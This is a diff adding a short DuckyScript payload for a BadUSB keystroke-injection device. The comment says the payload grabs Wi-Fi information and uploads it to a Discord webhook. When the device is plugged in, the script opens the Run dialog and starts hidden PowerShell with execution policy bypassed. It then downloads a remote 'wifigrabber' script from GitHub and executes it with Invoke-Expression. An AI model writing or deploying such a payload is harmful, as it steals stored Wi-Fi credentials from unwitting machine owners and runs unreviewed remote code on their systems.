@@ -1,0 +1,6 @@
+REM This script grabs wifi information and uploads to my Discord, do NOT run this script without removing the webhook
+DELAY 1000
+GUI r
+DELAY 250
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/Brereid98/BADUSB_Files/main/WiFi_grabber/wifigrabber.ps1?dl=1; invoke-expression $pl
+ENTER
